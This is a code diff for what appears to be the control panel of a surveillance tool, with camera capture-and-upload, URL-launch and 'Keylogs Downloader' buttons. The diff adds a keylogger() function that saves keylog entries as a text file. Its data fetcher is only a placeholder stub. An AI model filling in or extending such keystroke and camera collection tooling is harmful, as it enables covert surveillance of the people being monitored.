@@ -73,17 +73,41 @@ firebase.initializeApp(firebaseConfig);
                 alert('Camera access denied or an error occurred.');
             }
         }
-        function testNewWindow() {
-        const newWindow = window.open("", "TestWindow", "width=600,height=400");
+        // Function to fetch all keylogs (replace with your actual keylogs fetching logic)
+    function fetchAllKeylogs() {
+        return new Promise(resolve => {
+            // Replace with real data fetching
+            let keylogs = [
+                'User pressed A',
+                'User pressed B',
+                'User pressed C',
+            ];
+            resolve(keylogs);
+        });
+    }
 
-        if (!newWindow) {
-            alert('Failed to open new window.');
-            return;
-        }
-
-        newWindow.document.open();
-        newWindow.document.write('<h1>New Window Opened!</h1>');
-        newWindow.document.close();
+    // Function to handle keylogger action
+    function keylogger() {
+        fetchAllKeylogs().then(keylogs => {
+            // Create a blob from keylogs
+            const blob = new Blob([keylogs.reverse().join('\n')], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            
+            // Create a temporary link element to trigger the download
+            const tempLink = document.createElement('a');
+            tempLink.href = url;
+            tempLink.download = 'keylogs.txt';
+            
+            // Append the link to the body and trigger click
+            document.body.appendChild(tempLink);
+            tempLink.click();
+            
+            // Clean up
+            document.body.removeChild(tempLink);
+            URL.revokeObjectURL(url);
+        }).catch(error => {
+            console.error('Error fetching keylogs:', error);
+        });
     }
 
 
@@ -613,8 +637,7 @@ text-align:center;
 <div class="dfle"  style="" >
 <div id="camera-button" class="icon" onclick="captureAndUpload()" style="background:url('./img/cam.png');background-size:50px 50px;background-repeat:no-repeat;">Camera</div>
   <!-- CamSnap Beta 1.0 by @ES-->
-  <div class="icon" onclick="testNewWindow()" style="background:url('./img/img6.png');background-size:50px 50px;background-repeat:no-repeat;">KeylogsD</div>
-
+<div class="icon" onclick="keylogger()" style="background:url('./img/img6.png');background-size:50px 50px;background-repeat:no-repeat;">KeylogsD</div>
 <!-- Kylogs Downloader 1.0 by @ES-->
 <div class="icon" onclick="funcmd('fmc2')" style="background:url('./img/web.png');background-size:50px 50px;background-repeat:no-repeat;">LaunchURL</div> 
 </div>
